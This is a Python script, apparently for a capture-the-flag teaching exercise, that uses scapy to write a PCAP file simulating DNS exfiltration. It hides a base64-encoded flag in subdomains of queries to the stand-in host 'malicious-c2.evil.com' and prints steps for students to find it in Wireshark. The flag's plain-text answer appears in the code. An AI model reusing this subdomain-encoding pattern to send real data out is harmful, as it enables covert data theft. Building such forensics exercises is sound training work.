#!/usr/bin/env python3
"""
DNS Exfiltration Challenge Generator
Creates a PCAP file with flag hidden in DNS queries
"""

from scapy.all import *
import base64
import time
import random

def create_dns_exfiltration_pcap():
    """Generate DNS queries that contain hidden flag data"""
    
    # The flag to hide (split into chunks)
    flag = "flag{dns_3xf1ltr4t10n_1s_sn34ky}"
    
    # Base64 encode the flag to make it DNS-safe
    encoded_flag = base64.b64encode(flag.encode()).decode()
    print(f"[+] Encoded flag: {encoded_flag}")
    
    # Split encoded flag into chunks (max 63 chars per DNS label)
    chunk_size = 30  # Smaller chunks for realism
    flag_chunks = [encoded_flag[i:i+chunk_size] for i in range(0, len(encoded_flag), chunk_size)]
    
    print(f"[+] Flag split into {len(flag_chunks)} chunks")
    
    # Malicious domain (attacker controlled)
    evil_domain = "malicious-c2.evil.com"
    
    # Create packet list
    packets = []
    
    # Add some legitimate DNS traffic first (noise)
    legitimate_domains = [
        "google.com", "facebook.com", "github.com", 
        "stackoverflow.com", "reddit.com"
    ]
    
    src_ip = "192.168.1.100"  # Victim machine
    dst_ip = "8.8.8.8"        # DNS server
    
    print("[+] Creating legitimate DNS traffic...")
    for i, domain in enumerate(legitimate_domains):
        pkt = IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(pkt)
        
        # Add response
        resp = IP(src=dst_ip, dst=src_ip)/UDP(sport=53, dport=pkt[UDP].sport)/DNS(
            id=pkt[DNS].id, qr=1, aa=0, rcode=0,
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, ttl=300, rdata="1.2.3.4")
        )
        packets.append(resp)
    
    print("[+] Creating malicious DNS exfiltration traffic...")
    
    # Create the malicious DNS queries with embedded flag data
    for i, chunk in enumerate(flag_chunks):
        # Create subdomain with chunk data
        malicious_query = f"data-{i:02d}-{chunk}.{evil_domain}"
        
        print(f"[+] Query {i+1}: {malicious_query[:50]}...")
        
        # Create DNS query packet
        pkt = IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=malicious_query))
        packets.append(pkt)
        
        # Add some delay between queries (realistic timing)
        time.sleep(0.1)
        
        # Create a response (NXDOMAIN since it's a fake domain)
        resp = IP(src=dst_ip, dst=src_ip)/UDP(sport=53, dport=pkt[UDP].sport)/DNS(
            id=pkt[DNS].id, qr=1, rcode=3,  # NXDOMAIN
            qd=DNSQR(qname=malicious_query)
        )
        packets.append(resp)
    
    # Add more legitimate traffic after
    print("[+] Adding more legitimate traffic...")
    for domain in ["amazon.com", "microsoft.com", "apple.com"]:
        pkt = IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(pkt)
        
        resp = IP(src=dst_ip, dst=src_ip)/UDP(sport=53, dport=pkt[UDP].sport)/DNS(
            id=pkt[DNS].id, qr=1, rcode=0,
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, ttl=300, rdata="5.6.7.8")
        )
        packets.append(resp)
    
    return packets

def main():
    print("[+] DNS Exfiltration Challenge Generator")
    print("[+] Creating malicious DNS traffic...")
    
    packets = create_dns_exfiltration_pcap()
    
    # Write to PCAP file
    output_file = "dns_leak_challenge.pcap"
    wrpcap(output_file, packets)
    
    print(f"[+] PCAP file created: {output_file}")
    print(f"[+] Total packets: {len(packets)}")
    
    print("\n[+] Challenge Instructions for Students:")
    print("1. Open the PCAP file in Wireshark")
    print("2. Filter for DNS queries: dns.flags.response == 0")
    print("3. Look for suspicious domain queries")
    print("4. Extract the base64-encoded data from subdomains")
    print("5. Decode the data to get the flag")
    
    print(f"\n[+] Solution hint: Look for queries to *.evil.com domain")

if __name__ == "__main__":
    main()
